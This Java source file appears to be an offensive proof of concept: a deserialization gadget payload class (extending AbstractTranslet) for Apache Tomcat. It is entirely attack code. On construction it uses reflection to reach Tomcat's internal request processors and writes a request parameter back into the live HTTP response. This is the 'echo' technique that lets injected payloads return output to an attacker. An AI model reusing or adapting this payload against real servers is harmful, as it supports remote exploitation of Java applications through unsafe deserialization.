package ccdr4gon.test;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Service;
import org.apache.catalina.WebResourceRoot;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.ParallelWebappClassLoader;
import org.apache.coyote.AbstractProtocol;
import org.apache.coyote.Request;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;
import org.apache.tomcat.util.buf.ByteChunk;
import java.lang.reflect.Field;
import org.apache.commons.collections.map.LazyMap;
import org.apache.tomcat.util.net.AbstractEndpoint;
import java.util.ArrayList;


public class TomcatEchoArchive extends AbstractTranslet {
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
    public TomcatEchoArchive() throws Exception {
        super();
        super.namesArray= new String[]{"ccdr4gon"};
        WebResourceRoot resource= ((ParallelWebappClassLoader) Thread.currentThread().getContextClassLoader()).getResources();
        StandardContext standardContext = (StandardContext) resource.getContext();
        Field context=standardContext.getClass().getDeclaredField("context");
        context.setAccessible(true);
        ApplicationContext applicationContext= (ApplicationContext) context.get(standardContext);

        Field field=applicationContext.getClass().getDeclaredField("service");
        field.setAccessible(true);
        Service service= (Service) field.get(applicationContext);

        AbstractProtocol  protocolhandler= (AbstractProtocol) service.findConnectors()[0].getProtocolHandler();

        field=Class.forName("org.apache.coyote.AbstractProtocol").getDeclaredField("handler");
        field.setAccessible(true);
        AbstractEndpoint.Handler handler= (AbstractEndpoint.Handler) field.get((AbstractProtocol)protocolhandler);
        RequestGroupInfo global=(RequestGroupInfo)handler.getGlobal();

        field=global.getClass().getDeclaredField("processors");
        field.setAccessible(true);
        ArrayList<RequestInfo> processors= (ArrayList<RequestInfo>) field.get(global);

        field = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
        field.setAccessible(true);

        for (int i=0;i<processors.size();i++){
            Request request = (Request) field.get(processors.get(i));
            String username = request.getParameters().getParameter("username");
            if(username != null){
                byte[] buf = username.getBytes();
                ByteChunk bc = new ByteChunk();
                bc.setBytes(buf, 0, buf.length);
                request.getResponse().doWrite(bc);
                break;
            }
        }
    }

    public TomcatEchoArchive(LazyMap map){    }

}
